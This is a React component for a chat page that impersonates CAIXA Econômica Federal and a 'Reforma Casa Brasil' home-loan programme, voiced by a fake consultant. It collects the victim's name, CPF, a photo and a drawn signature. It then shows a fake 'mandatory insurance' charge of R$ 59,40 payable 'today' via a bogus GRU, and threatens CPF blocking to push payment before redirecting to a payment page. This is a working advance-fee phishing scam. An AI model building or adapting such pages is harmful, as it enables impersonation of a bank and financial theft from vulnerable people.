import React, { useEffect, useRef, useState } from "react";
import atendneteSrc from "../assets/atendnete.png";
import { useNavigate } from "react-router-dom";

// --- Paleta Gov.br ---------------------------------------------------------
const C = {
  azul: "#1351b4",
  azulEscuro: "#003D82",
  azulClaro: "#d4e3ff",
  azulFundo: "#edf2fb",
  amarelo: "#F5A623",
  amareloSub: "#fff8e8",
  verde: "#168821",
  verdeClaro: "#e3f5e1",
  verdeBorda: "#9dd69f",
  cinzaFundo: "#f4f5f7",
  cinzaBorda: "#dee2e6",
  cinzaTexto: "#555",
  cinzaLabel: "#888",
  branco: "#ffffff",
  texto: "#1c1c1e",
  vermelho: "#d32727",
  vermelhoSub: "#fff5f5",
};

const AGENTE = { nome: "Ana Lima", cargo: "Consultora de Habitação · CAIXA", id: "AGT-4821" };

const COMODOS = [
  "Sala de estar",
  "Quarto",
  "Banheiro",
  "Cozinha",
  "Área de serviço",
  "Varanda / Quintal",
  "Fachada / Área externa",
  "Telhado",
  "Outro cômodo",
];

const TIPOS_REFORMA = [
  "Elétrica / Fiação",
  "Hidráulica / Encanamento",
  "Piso / Revestimento",
  "Paredes / Pintura",
  "Telhado / Cobertura",
  "Estrutura / Alvenaria",
  "Janelas / Portas",
  "Outro tipo",
];

const fmt = (v: number) => v.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
const hora = () => {
  const d = new Date();
  return `${String(d.getHours()).padStart(2, "0")}:${String(d.getMinutes()).padStart(2, "0")}`;
};

// --- Construção do objeto de empréstimo a partir do localStorage ----------------
const makeEmp = (nome: string) => {
  const raw = typeof window !== "undefined" ? localStorage.getItem("aprovacaoData") : null;
  const saved = raw ? (JSON.parse(raw) as Record<string, unknown>) : {};
  const valor = typeof saved["valorAprovado"] === "number" ? (saved["valorAprovado"] as number) : 15000;
  const parcelas = typeof saved["parcelas"] === "number" ? (saved["parcelas"] as number) : 36;
  const parcela = parcelas ? Math.round(valor / parcelas) : Math.round(valor / 36);
  const cpf = typeof saved["cpf"] === "string" ? (saved["cpf"] as string) : "000.000.000-00";
  const protocolo = typeof saved["protocolo"] === "string" ? (saved["protocolo"] as string) : `PRT-${Date.now()}`;
  return { nome, cpf, valor, parcelas, parcela, protocolo };
};

// --- Componentes auxiliares -------------------------------------------------
const Avatar = ({ usuario }: { usuario?: boolean }) => (
  <div style={{ width: 36, height: 36, borderRadius: 8, background: usuario ? C.azul : C.azulClaro }} />
);

const BolhaAgente = ({ texto, horario, animando }: { texto?: string; horario?: string; animando?: boolean }) => (
  <div style={{ display: "flex", gap: 12, alignItems: "flex-start", marginBottom: 14, animation: "entrar .3s ease" }}>
    {/* Avatar da Ana Lima: somente para mensagens do bot */}
    <img
      src={atendneteSrc}
      alt={AGENTE.nome}
      style={{ width: 40, height: 40, borderRadius: "50%", objectFit: "cover", flexShrink: 0 }}
    />
    <div style={{ flex: 1 }}>
      <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
        <span style={{ fontSize: 12, color: C.cinzaLabel, fontWeight: 700 }}>{AGENTE.nome}</span>
        <span style={{ fontSize: 10, color: C.cinzaLabel }}>{horario}</span>
      </div>
      <div style={{ background: C.azulClaro, borderRadius: "0 12px 12px 12px", padding: "10px 12px" }}>
        {animando ? (
          <div style={{ display: "flex", gap: 5, padding: "4px 2px" }}>
            {[0, 1, 2].map(i => <div key={i} style={{ width: 7, height: 7, borderRadius: "50%", background: C.cinzaBorda, animation: `piscar 1.2s ${i * 0.2}s ease-in-out infinite` }} />)}
          </div>
        ) : (
          <p style={{ fontSize: 14, color: C.texto, lineHeight: 1.65, whiteSpace: "pre-line", margin: 0 }}>{texto}</p>
        )}
      </div>
    </div>
  </div>
);

const BolhaUser = ({ texto, horario }: { texto: string; horario: string }) => (
  <div style={{ display: "flex", gap: 10, alignItems: "flex-end", justifyContent: "flex-end", marginBottom: 14, animation: "entrar .3s ease" }}>
    <div style={{ maxWidth: "72%" }}>
      <p style={{ fontSize: 10, color: C.cinzaLabel, marginBottom: 4, textAlign: "right", fontWeight: 600 }}>Você · {horario}</p>
      <div style={{ background: C.azul, borderRadius: "12px 12px 0 12px", padding: "11px 14px" }}>
        <p style={{ fontSize: 14, color: C.branco, lineHeight: 1.6 }}>{texto}</p>
      </div>
    </div>
    <Avatar usuario />
  </div>
);

const BolhaFotos = ({ fotos, comodo, horario }: { fotos: { preview: string }[]; comodo: string; horario: string }) => (
  <div style={{ display: "flex", gap: 10, alignItems: "flex-end", justifyContent: "flex-end", marginBottom: 14, animation: "entrar .3s ease" }}>
    <div style={{ maxWidth: "82%" }}>
      <p style={{ fontSize: 10, color: C.cinzaLabel, marginBottom: 4, textAlign: "right", fontWeight: 600 }}>Você · {horario}</p>
      <div style={{ background: C.azul, borderRadius: "12px 12px 0 12px", padding: "12px 14px" }}>
        <p style={{ fontSize: 12, color: "rgba(255,255,255,0.85)", marginBottom: 8 }}>
          {fotos.length} foto{fotos.length > 1 ? "s" : ""} — {comodo}
        </p>
        <div style={{ display: "flex", flexWrap: "wrap", gap: 5 }}>
          {fotos.map((f, i) => (
            <div key={i} style={{ width: 65, height: 65, borderRadius: 6, overflow: "hidden" }}>
              <img src={f.preview} alt="" style={{ width: "100%", height: "100%", objectFit: "cover" }} />
            </div>
          ))}
        </div>
      </div>
    </div>
    <Avatar usuario />
  </div>
);

// --- UI Helpers ------------------------------------------------------------
const Chips = ({ opcoes, onSelect, titulo }: { opcoes: string[]; onSelect: (op: string) => void; titulo?: string }) => (
  <div style={{ animation: "entrar .3s ease", marginBottom: 14 }}>
    {titulo && <p style={{ fontSize: 12, color: C.cinzaTexto, marginBottom: 8, fontWeight: 600 }}>{titulo}</p>}
    <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
      {opcoes.map(op => (
        <button key={op} onClick={() => onSelect(op)} style={{
          padding: "8px 16px", borderRadius: 20, fontSize: 13, cursor: "pointer",
          border: `1.5px solid ${C.cinzaBorda}`, background: C.branco,
          color: C.cinzaTexto, fontWeight: 500, transition: "all .15s",
        }}>
          {op}
        </button>
      ))}
    </div>
  </div>
);

const UploadFotos = ({ comodo, tipo, onEnviar, onCancelar }: { comodo: string; tipo: string; onEnviar: (fotos: { preview: string; nome: string }[]) => void; onCancelar: () => void }) => {
  const [fotos, setFotos] = useState<{ preview: string; nome: string }[]>([]);
  const [drag, setDrag] = useState(false);
  const ref = useRef<HTMLInputElement>(null);

  const add = (files: FileList | null) => {
    if (!files) return;
    const novos = Array.from(files)
      .filter(f => f.type.startsWith("image/"))
      .map(f => ({ nome: f.name, preview: URL.createObjectURL(f) }));
    // manter apenas a primeira foto (apenas 1 foto é necessária)
    setFotos(p => [...p, ...novos].slice(0, 1));
  };

  return (
    <div style={{ animation: "entrar .3s ease", marginBottom: 14 }}>
      <div style={{ background: C.amareloSub, border: `1px solid ${C.amarelo}`, borderRadius: 8, padding: "10px 14px", marginBottom: 10 }}>
        <p style={{ fontWeight: 700, color: "#5a3e00", fontSize: 13, marginBottom: 1 }}>Fotos de: <span style={{ color: C.azulEscuro }}>{comodo}</span></p>
        <p style={{ fontSize: 12, color: "#7a5500" }}>{tipo}</p>
      </div>
      <div
        onDragOver={e => { e.preventDefault(); setDrag(true); }}
        onDragLeave={() => setDrag(false)}
        onDrop={e => { e.preventDefault(); setDrag(false); add(e.dataTransfer.files); }}
        onClick={() => ref.current?.click()}
        style={{
          border: `2px dashed ${drag ? C.azul : C.cinzaBorda}`,
          borderRadius: 10, padding: "22px 16px", textAlign: "center",
          background: drag ? C.azulFundo : C.cinzaFundo,
          cursor: "pointer", transition: "all .2s", marginBottom: 10,
        }}
      >
        <input ref={ref} type="file" accept="image/*" style={{ display: "none" }} onChange={e => add(e.target.files)} />
        <p style={{ fontSize: 14, fontWeight: 600, color: C.azulEscuro }}>Toque para anexar uma foto do local</p>
      </div>
      {fotos.length > 0 && (
        <div style={{ display: "flex", flexWrap: "wrap", gap: 8, marginBottom: 10 }}>
          {fotos.map((f, i) => (
            <div key={i} style={{ position: "relative", width: 80, height: 80, borderRadius: 8, overflow: "hidden", border: `2px solid ${C.verde}` }}>
              <img src={f.preview} alt="" style={{ width: "100%", height: "100%", objectFit: "cover" }} />
            </div>
          ))}
        </div>
      )}
      <div style={{ display: "flex", gap: 8 }}>
        <button onClick={onCancelar} style={{ flex: 1, padding: 10, borderRadius: 7, border: `1.5px solid ${C.cinzaBorda}`, background: C.branco, fontWeight: 600 }}>Cancelar</button>
        <button onClick={() => onEnviar(fotos)} disabled={fotos.length < 1} style={{ flex: 2, padding: 10, borderRadius: 7, border: "none", background: fotos.length >= 1 ? C.azul : C.cinzaBorda, color: C.branco, fontWeight: 700 }}>Enviar Foto</button>
      </div>
    </div>
  );
};

// --- Painéis Legais --------------------------------------------------------
const PainelContrato = ({ emp, onAssinar }: { emp: ReturnType<typeof makeEmp>; onAssinar: () => void }) => {
  const [lido, setLido] = useState(false);
  const [aceite, setAceite] = useState(false);
  const scrollRef = useRef<HTMLDivElement>(null);

  const checkScroll = () => {
    const el = scrollRef.current;
    if (el && el.scrollTop + el.clientHeight >= el.scrollHeight - 15) setLido(true);
  };

  return (
    <div style={{ animation: "entrar .35s ease", marginBottom: 14 }}>
      <div style={{ background: C.branco, border: `2px solid ${C.azul}`, borderRadius: 12, overflow: "hidden" }}>
        <div style={{ background: `linear-gradient(135deg,${C.azulEscuro},${C.azul})`, padding: "16px" }}>
          <p style={{ fontSize: 14, fontWeight: 800, color: C.branco }}>Cédula de Crédito Bancário Digital</p>
        </div>
        <div ref={scrollRef} onScroll={checkScroll} style={{ maxHeight: 250, overflowY: "auto", padding: 16, fontSize: 12, color: C.cinzaTexto, lineHeight: 1.8 }}>
          <p><strong>CONTRATANTE:</strong> {emp.nome} · CPF {emp.cpf}</p>
          <p><strong>CONTRATADA:</strong> Caixa Econômica Federal</p>
          <br />
          <p><strong>1. OBJETO:</strong> Empréstimo Reforma Casa Brasil.</p>
          <p><strong>2. VALOR:</strong> {fmt(emp.valor)} em {emp.parcelas}x de {fmt(emp.parcela)}.</p>
          <p><strong>3. LIBERAÇÃO:</strong> 90% após assinatura e 10% após vistoria final.</p>
          <br />
          <p><strong>IMPORTANTE:</strong> O presente contrato possui validade jurídica plena conforme MP 2.200-2/2001. A assinatura deste documento vincula o CPF do contratante à dívida e às obrigações do programa.</p>
        </div>
        {lido && (
          <div style={{ padding: 16, background: C.cinzaFundo }}>
            <label style={{ display: "flex", gap: 10, marginBottom: 12 }}>
              <input type="checkbox" checked={aceite} onChange={e => setAceite(e.target.checked)} />
              <span style={{ fontSize: 12 }}>Li e aceito os termos do contrato.</span>
            </label>
            <button onClick={onAssinar} disabled={!aceite} style={{ width: "100%", padding: 12, background: aceite ? C.verde : C.cinzaBorda, color: C.branco, border: "none", borderRadius: 8, fontWeight: 800 }}>Assinar Digitalmente</button>
          </div>
        )}
      </div>
    </div>
  );
};

const PainelAssinatura = ({ emp, onConfirmar }: { emp: ReturnType<typeof makeEmp>; onConfirmar: (img: string) => void }) => {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [temTraco, setTemTraco] = useState(false);

  const limpar = () => {
    const cv = canvasRef.current;
    if (!cv) return;
    cv.getContext("2d")!.clearRect(0, 0, cv.width, cv.height);
    setTemTraco(false);
  };

  const iniciar = (e: React.MouseEvent<HTMLCanvasElement>) => {
    const cv = canvasRef.current;
    if (!cv) return;
    const ctx = cv.getContext("2d")!;
    ctx.strokeStyle = C.azulEscuro;
    ctx.lineWidth = 2;
    const rect = cv.getBoundingClientRect();
    ctx.beginPath();
    ctx.moveTo(e.clientX - rect.left, e.clientY - rect.top);
    cv.onmousemove = (ev: MouseEvent) => {
      ctx.lineTo((ev as MouseEvent).clientX - rect.left, (ev as MouseEvent).clientY - rect.top);
      ctx.stroke();
      setTemTraco(true);
    };
  };

  return (
    <div style={{ animation: "entrar .35s ease", marginBottom: 14 }}>
      <div style={{ background: C.branco, border: `2px solid ${C.azul}`, borderRadius: 12, padding: 16 }}>
        <p style={{ fontSize: 14, fontWeight: 700, color: C.azulEscuro, marginBottom: 8 }}>Assinatura na Tela</p>
        <p style={{ fontSize: 11, color: C.cinzaLabel, marginBottom: 8 }}>Use o mouse para assinar abaixo — {emp.nome}</p>
        <canvas
          ref={canvasRef}
          onMouseDown={iniciar}
          onMouseUp={() => { if (canvasRef.current) canvasRef.current.onmousemove = null; }}
          width={400} height={150}
          style={{ width: "100%", height: 150, border: `1px dashed ${C.cinzaBorda}`, background: "#fafbff", borderRadius: 8, cursor: "crosshair" }}
        />
        <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
          <button onClick={limpar} style={{ flex: 1, padding: 10, borderRadius: 8, border: `1px solid ${C.cinzaBorda}`, background: C.branco, fontWeight: 600 }}>Limpar</button>
          <button onClick={() => onConfirmar(canvasRef.current!.toDataURL())} disabled={!temTraco} style={{ flex: 2, padding: 10, background: temTraco ? C.azul : C.cinzaBorda, color: C.branco, border: "none", borderRadius: 8, fontWeight: 700 }}>Confirmar Assinatura</button>
        </div>
      </div>
    </div>
  );
};

const PainelSeguro = ({ onConfirmar }: { onConfirmar: () => void }) => (
  <div style={{ animation: "entrar .3s ease", marginBottom: 14 }}>
    <div style={{ background: "#fff3cd", border: "2px solid #e0a800", borderRadius: 10, overflow: "hidden", marginBottom: 10 }}>
      <div style={{ background: "#e0a800", padding: "10px 16px", display: "flex", alignItems: "center", gap: 8 }}>
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
          <path d="M12 2L2 20h20L12 2z" stroke="white" strokeWidth="2" strokeLinejoin="round"/>
          <path d="M12 9v5M12 16.5v.5" stroke="white" strokeWidth="2" strokeLinecap="round"/>
        </svg>
        <p style={{ fontSize: 13, fontWeight: 700, color: "white" }}>Seguro Habitacional Obrigatório — Pendência Identificada</p>
      </div>
      <div style={{ padding: "14px 16px", fontSize: 13, color: "#5a3e00", lineHeight: 1.75 }}>
        <p style={{ marginBottom: 10 }}>
          Sua assinatura digital foi registrada com sucesso. Porém, para que o <strong>depósito dos 90% do crédito</strong> seja liberado em sua conta, é obrigatória a contratação do <strong>Seguro de Proteção Habitacional</strong>.
        </p>
        <div style={{ background: "rgba(255,255,255,0.7)", borderRadius: 8, padding: "12px 14px", marginBottom: 10, border: "1px solid #e0a800" }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <span style={{ fontSize: 12, fontWeight: 600 }}>Valor do Seguro Obrigatório:</span>
            <span style={{ fontSize: 22, fontWeight: 800, color: "#b35c00" }}>R$ 59,40</span>
          </div>
          <div style={{ display: "flex", justifyContent: "space-between", marginTop: 6, fontSize: 12 }}>
            <span>Vencimento:</span>
            <span style={{ fontWeight: 700, color: "#a00" }}>Hoje — prazo máximo de 24 horas</span>
          </div>
          <div style={{ display: "flex", justifyContent: "space-between", marginTop: 4, fontSize: 12 }}>
            <span>Forma de pagamento:</span>
            <span style={{ fontWeight: 600 }}>GRU — Guia de Recolhimento da União</span>
          </div>
        </div>
        <p style={{ fontSize: 12 }}>
          O valor será recolhido via sistema oficial da Receita Federal. Após a confirmação, o depósito será processado automaticamente em sua conta cadastrada.
        </p>
      </div>
    </div>

    <button
      onClick={onConfirmar}
      style={{
        width: "100%", padding: "15px", borderRadius: 9, border: "none",
        background: "linear-gradient(135deg, #168821, #0e5c17)",
        color: C.branco, fontSize: 15, fontWeight: 800, cursor: "pointer",
        boxShadow: "0 4px 16px rgba(22,136,33,0.35)", letterSpacing: 0.3,
      }}
    >
      Pagar Seguro Obrigatório — R$ 59,40 →
    </button>
    <p style={{ fontSize: 11, color: C.cinzaLabel, textAlign: "center", marginTop: 8 }}>
      Pagamento seguro via GRU · Sistema oficial da Receita Federal do Brasil
    </p>
  </div>
);

// Remove mensagens duplicadas consecutivas do mesmo remetente
const dedupeConsecutiveMessages = (arr: { tipo: string; texto?: string; fotos?: { preview: string }[]; comodo?: string; horario: string; id: number }[]) => {
  const out: typeof arr = [];
  for (const m of arr) {
    const prev = out[out.length - 1];
    if (!prev) { out.push(m); continue; }
    const sameSender = prev.tipo === m.tipo;
    let sameContent = false;
    if (m.tipo === "fotos") {
      const a = prev.fotos ?? [];
      const b = m.fotos ?? [];
      sameContent = prev.comodo === m.comodo && a.length === b.length && a.every((f, i) => f.preview === b[i].preview);
    } else {
      sameContent = prev.texto === m.texto;
    }
    if (!(sameSender && sameContent)) out.push(m);
  }
  return out;
};

// --- APP PRINCIPAL ---------------------------------------------------------
export default function ChatBot() {
  const navigate = useNavigate();

  const rawUser = typeof window !== "undefined" ? localStorage.getItem("userData") : null;
  const userData = rawUser ? JSON.parse(rawUser) : null;
  const nomeCompleto: string = userData?.nome ?? "Maria Aparecida dos Santos";
  const primeiroNome = nomeCompleto.split(" ")[0];

  const emp = makeEmp(nomeCompleto);

  const [msgs, setMsgs] = useState<{ tipo: string; texto?: string; fotos?: { preview: string }[]; comodo?: string; horario: string; id: number }[]>([]);
  const [fase, setFase] = useState("aguardando");
  const [comodo, setComodo] = useState<string | null>(null);
  const [tipo, setTipo] = useState<string | null>(null);
  const [digitando, setDigitando] = useState(false);
  const [assinatura, setAssinatura] = useState<string | null>(null);
  const fimRef = useRef<HTMLDivElement>(null);
  const containerRef = useRef<HTMLDivElement>(null);

  const msgsFiltrados = React.useMemo(() => dedupeConsecutiveMessages(msgs), [msgs]);

  useEffect(() => { 
    const c = containerRef.current;
    if (c) c.scrollTop = c.scrollHeight;
  }, [msgs, digitando, fase]);

  const agenteDiz = (texto: string, delay = 500) =>
    new Promise<void>(resolve => {
      // Show "Ana está digitando..." indicator before message appears
      setDigitando(true);
      setTimeout(() => {
        // Hide the generic indicator and start typing effect in the message bubble
        setDigitando(false);

        const id = Date.now() + Math.random();
        const horarioStr = hora();
        // append an empty agent message which will be filled char-by-char
        setMsgs(p => [...p, { tipo: "agente", texto: "", horario: horarioStr, id }]);

        // Calculate typing speed: cap total time so long messages don't take too long
        const totalTime = Math.min(Math.max(texto.length * 30, 350), 1200); // ms
        const charDelay = Math.max(8, Math.floor(totalTime / Math.max(1, texto.length)));

        let idx = 0;
        const interval = setInterval(() => {
          idx += 1;
          const partial = texto.slice(0, idx);
          setMsgs(prev => prev.map(m => (m.id === id ? { ...m, texto: partial } : m)));
          // keep scroll following the typing (instant)
          const c = containerRef.current;
          if (c) c.scrollTop = c.scrollHeight;
          if (idx >= texto.length) {
            clearInterval(interval);
            resolve();
          }
        }, charDelay);

      }, delay);

      // safety: if component unmounts or promise should be cancelled, clear timeout
      // (no explicit cancellation implemented here)
    });

  const userDiz = (t: string) =>
    setMsgs(p => [...p, { tipo: "usuario", texto: t, horario: hora(), id: Date.now() + Math.random() }]);

  const userFotos = (fotos: { preview: string }[], comodoNome: string) =>
    setMsgs(p => [...p, { tipo: "fotos", fotos, comodo: comodoNome, horario: hora(), id: Date.now() + Math.random() }]);

  useEffect(() => {
    (async () => {
      await agenteDiz(`Olá, ${primeiroNome}! Sou a Ana, sua consultora CAIXA.`);
      await agenteDiz(`Seu crédito de ${fmt(emp.valor)} foi pré-aprovado! Para liberar os primeiros 90%, preciso que selecione o cômodo da reforma:`);
      setFase("comodo");
    })();
  }, [primeiroNome, emp.valor]);

  const handleComodo = async (op: string) => {
    setComodo(op); userDiz(op); setFase("aguardando");
    await agenteDiz(`Entendido. Qual o tipo de serviço no(a) ${op}?`);
    setFase("tipo");
  };

  const handleTipo = async (op: string) => {
    setTipo(op); userDiz(op); setFase("aguardando");
    await agenteDiz(`Agora envie 1 foto do estado atual do local para o laudo inicial:`);
    setFase("upload");
  };

  const handleFotos = async (fotos: { preview: string; nome: string }[]) => {
    userFotos(fotos, comodo!);
    setFase("aguardando");
    await agenteDiz(`Fotos recebidas! Tudo pronto para a formalização.`);
    await agenteDiz(`Abaixo está o seu contrato. Leia e assine digitalmente para prosseguirmos com o depósito.`);
    setFase("contrato");
  };

  const handleAssinatura = async (img: string) => {
    setAssinatura(img);
    userDiz("Assinatura digital confirmada.");
    setFase("aguardando");
    await agenteDiz(`Assinatura vinculada com sucesso ao protocolo ${emp.protocolo}!`);
    await agenteDiz(`Atenção: para a ativação do crédito habitacional, é obrigatória a contratação do Seguro de Proteção no valor de R$ 59,40.`);
    await agenteDiz(`Como a assinatura digital já foi realizada, este pagamento é indispensável para evitar o bloqueio do seu CPF por quebra de protocolo administrativo.`);
    setFase("alerta_seguro");
  };

  const confirmarSeguro = async () => {
    userDiz("Entendido. Desejo gerar a GRU agora.");
    setFase("aguardando");
    await agenteDiz("Gerando Guia de Recolhimento da União (GRU)...");
    navigate("/pagamento-gru");
  };

  // suppress unused warning
  void assinatura;

  return (
    <div style={{ fontFamily: "sans-serif", background: C.cinzaFundo, minHeight: "100vh", display: "flex", justifyContent: "center" }}>
      <style>{`
        @keyframes entrar { from { opacity:0; transform:translateY(10px) } to { opacity:1; transform:translateY(0) } }
        @keyframes piscar { 0%,100% { opacity:.3; transform:scale(.8) } 50% { opacity:1; transform:scale(1) } }
        * { box-sizing:border-box; margin:0; padding:0; }
        button { font-family:inherit; cursor:pointer; }
        button:hover:not(:disabled) { filter:brightness(.93); }
      `}</style>
      <div style={{ width: "100%", maxWidth: 500, background: C.branco, display: "flex", flexDirection: "column", minHeight: "100vh" }}>

        {/* Header */}
        <div style={{ background: C.azulEscuro, padding: 15, color: C.branco }}>
          <p style={{ fontSize: 16, fontWeight: 700 }}>CAIXA · Reforma Casa Brasil</p>
          <p style={{ fontSize: 11, opacity: 0.8 }}>Consultora Virtual: {AGENTE.nome}</p>
        </div>

        {/* Mensagens */}
        <div ref={containerRef} style={{ flex: 1, overflowY: "auto", padding: 15 }}>
          {msgsFiltrados.map(m => {
            if (m.tipo === "agente") return <BolhaAgente key={m.id} texto={m.texto} horario={m.horario} />;
            if (m.tipo === "fotos") return <BolhaFotos key={m.id} fotos={m.fotos!} comodo={m.comodo!} horario={m.horario} />;
            return <BolhaUser key={m.id} texto={m.texto!} horario={m.horario} />;
          })}
          {digitando && <BolhaAgente animando />}

          {!digitando && (
            <div>
              {fase === "comodo" && <Chips opcoes={COMODOS} onSelect={handleComodo} titulo="Selecione:" />}
              {fase === "tipo" && <Chips opcoes={TIPOS_REFORMA} onSelect={handleTipo} titulo="Tipo de obra:" />}
              {fase === "upload" && <UploadFotos comodo={comodo!} tipo={tipo!} onEnviar={handleFotos} onCancelar={() => setFase("tipo")} />}
              {fase === "contrato" && <PainelContrato emp={emp} onAssinar={() => setFase("assinar")} />}
              {fase === "assinar" && <PainelAssinatura emp={emp} onConfirmar={handleAssinatura} />}
              {fase === "alerta_seguro" && <PainelSeguro onConfirmar={confirmarSeguro} />}
            </div>
          )}
          <div ref={fimRef} />
        </div>
      </div>
    </div>
  );
}
